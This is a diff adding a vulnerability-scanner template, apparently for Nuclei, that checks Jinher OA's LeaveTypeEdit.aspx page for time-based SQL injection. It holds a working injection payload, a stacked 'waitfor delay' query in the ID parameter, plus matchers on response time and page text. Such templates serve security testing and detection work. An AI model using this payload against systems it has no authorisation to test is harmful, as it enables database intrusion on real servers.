@@ -1,0 +1,32 @@
+id: poc-yaml-jinher-jhsoft-leavetypeedit-aspx-sqli
+info:
+  name: 金和OA LeaveTypeEdit.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.dossier/LeaveTypeEdit.aspx/?ID=1;waitfor+delay%270:0:{{t1}}%27--&type=EDIT HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "类型名称不能为空"
+          - "修改类型"
+          - "类型名称"
+        condition: and
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
